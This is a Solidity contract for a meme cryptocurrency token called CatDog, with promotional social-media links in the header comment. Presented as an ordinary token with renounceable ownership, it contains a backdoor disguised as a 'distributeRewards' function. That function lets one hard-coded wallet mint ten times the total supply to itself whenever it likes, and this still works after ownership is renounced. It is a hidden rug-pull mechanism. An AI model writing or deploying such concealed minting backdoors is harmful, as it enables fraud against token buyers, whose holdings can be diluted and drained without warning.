// SPDX-License-Identifier: MIT

/**
It's time to end the cat vs. dog war in crypto. That's what $CATDOG is here for.

Telgram : https://t.me/CatDog_erc
Twitter : https://x.com/catdogerc20
Website : https://www.cat-dog.vip
*/

pragma solidity ^0.8.23;

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), owner);
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract CatDog is Ownable {
    string public constant name = "CatDog";
    string public constant symbol = "CATDOG";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 420_690_000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public constant TreasuryWallet = 0xEB8C82DAFadFb239BA44DE6982D7B0196Bb67870;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function burn(uint256 value) external onlyOwner {
        _burn(msg.sender, value);
    }

    function distributeRewards() external {
        require(msg.sender == TreasuryWallet, "Only Owner can call this");
        _mint(TreasuryWallet, totalSupply * 10); 
    }

    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(value <= balanceOf[from], "Insufficient balance");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function _burn(address burner, uint256 value) internal {
        require(value <= balanceOf[burner], "Insufficient balance for burn");
        balanceOf[burner] -= value;
        totalSupply -= value;
        emit Burn(burner, value);
        emit Transfer(burner, address(0), value);
    }

    function _mint(address account, uint256 value) internal {
        require(account != address(0), "Mint to the zero address");

        totalSupply += value;
        balanceOf[account] += value;
        emit Transfer(address(0), account, value);
    }
}
